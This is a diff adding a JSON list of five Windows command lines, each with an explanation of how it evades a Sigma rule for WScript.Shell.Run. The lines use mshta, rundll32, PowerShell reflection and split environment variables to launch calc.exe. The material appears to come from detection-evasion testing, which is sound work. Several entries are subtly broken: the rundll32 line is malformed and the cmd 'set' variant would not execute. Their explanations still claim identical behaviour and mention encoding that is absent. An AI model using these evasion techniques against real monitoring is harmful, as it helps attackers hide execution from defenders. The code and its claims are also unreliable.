@@ -1,0 +1,22 @@
+[
+  {
+    "output": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc.exe\"\"\")",
+    "explanation": "This command uses `mshta` to execute VBScript inline, calling `Wscript.Shell.Run` with encoded syntax and minimal elements to bypass the Sigma rule by omitting the full keyword sequence while still invoking the same behavior."
+  },
+  {
+    "output": "cmd.exe /c rundll32 vbscript:\"\\..\\mshtml,#135 \" + String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)",
+    "explanation": "This command uses `rundll32` with encoded VBScript to invoke `WScript.Shell.Run` without explicitly containing all the keywords in the original Sigma rule, leveraging path normalization and string concatenation."
+  },
+  {
+    "output": "powershell.exe -Command \"[Activator]::CreateInstance([Type]::GetTypeFromProgID('WScript.Shell')).Run('calc.exe')\"",
+    "explanation": "This PowerShell command uses reflection to instantiate `WScript.Shell` and call its `Run` method, avoiding direct string matches for the Sigma rule while maintaining the same functionality."
+  },
+  {
+    "output": "cmd.exe /c \"set a=Wscript. && set b=Shell && set c=Run && call %a%%b%.%c% calc.exe\"",
+    "explanation": "This command uses environment variables to split and reassemble the `Wscript.Shell.Run` string, avoiding direct keyword matches while still executing the same behavior."
+  },
+  {
+    "output": "mshta.exe about:<hta:application><script language=\"VBScript\">Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc.exe\"\"\")</script>",
+    "explanation": "This command uses `mshta` with an embedded VBScript tag to execute `Wscript.Shell.Run` without explicitly containing all the keywords in the Sigma rule, leveraging HTML and script tags for obfuscation."
+  }
+]
